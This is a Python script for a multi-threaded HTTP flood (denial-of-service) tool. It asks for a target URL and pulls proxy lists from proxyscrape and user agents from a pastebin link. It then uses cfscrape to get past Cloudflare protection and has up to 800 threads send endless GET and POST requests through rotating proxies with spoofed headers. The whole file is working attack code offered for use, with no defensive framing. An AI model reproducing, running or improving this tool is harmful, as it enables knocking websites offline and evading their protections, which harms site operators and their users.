import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore

NormalBlack = "\033[38;5;0m  \033[0m"
NormalRed = "\033[38;5;1m  \033[0m"
NormalGreen = "\033[38;5;2m  \033[0m"
NormalYellow = "\033[38;5;3m  \033[0m"
NormalBlue = "\033[38;5;4m  \033[0m"
NormalMagenta = "\033[38;5;5m  \033[0m"
NormalCyan = "\033[38;5;6m  \033[0m"
NormalWhite =  "\033[38;5;7m  \033[0m"
BrightBlack = "\033[48;5;0m  \033[0m"
BrightRed =  "\033[48;5;1m  \033[0m"
BrightGreen = "\033[48;5;2m  \033[0m"
BrightYellow = "\033[48;5;3m  \033[0m"
BrightBlue = "\033[48;5;4m  \033[0m"
BrightMagenta = "\033[48;5;5m  \033[0m"
BrightCyan = "\033[48;5;6m  \033[0m"
BrightWhite = "\033[48;5;7m  \033[0m"

REFERS = [
	"https://www.google.com/",
	"https://duckduckgo.com/",
	"https://ca.yahoo.com/?p=us"
]

def get_user_agent():
    return str(random.choice(user_agents))

def get_refer():
	return str(random.choice(REFERS))


def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Thread " + str(a+1) + " Created ")
	print("\033[00;1;95mPlease wait!")
	time.sleep(5)
	input(Fore.MAGENTA + "Press ENTER to launch attack!")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	global getua
	global user_agents
	os.system('cls')
	url = str(input("\033[00;1;95mURL to hit: " + Fore.CYAN))
	ssl = str(input("\033[00;1;95mEnable SSL Mode? (y/n): " + Fore.CYAN))
	ge = str(input("\033[00;1;95mGet new proxies? (y/n): " + Fore.CYAN))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000')
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Proxies downloaded!")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') 
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Proxies downloaded!")
	else:
		pass
	getua = requests.get('https://pastebin.com/raw/DL0QMNi3')
	with open('useragents.txt', 'wb') as fp:
		fp.write(getua.content)
	list = str(input("\033[00;1;95mList (proxies.txt) : " + Fore.CYAN))
	user_agents = str(input("\033[00;1;95mUser-Agants (useragents.txt) : " + Fore.CYAN))
	pprr = open(list).readlines()
	ua = open(user_agents).readlines()
	print("\033[00;1;95mProxies Count : " + Fore.CYAN + "%d" %len(pprr))
	thr = int(input("\033[00;1;95mThreads (1-800 Default Is 800) : " + Fore.CYAN))
	per = int(input("\033[00;1;95mPower (1-100 Default Is 100) : " + Fore.CYAN))
	opth()


def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	useragent = get_user_agent()
	refers = get_refer()
	headers = {
			"User-Agent": useragent,
			"Referer": refers
	}
	while True:
		while oo:
			try:
				s.get(url, headers=headers)
				print("\033[00;1;95mWAF Bypassed -> " + Fore.WHITE + str(url)+Fore.CYAN + ' Request Sent ' +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) 
				try:
					for g in range(per):
						s.post(url, headers=headers)
						print("\033[00;1;95mWAF Bypassed -> " + Fore.WHITE + str(url)+Fore.CYAN + ' Request Sent ' +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) 
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.WHITE + "Proxy Dead, or request failed!")


if __name__ == "__main__":
	main()
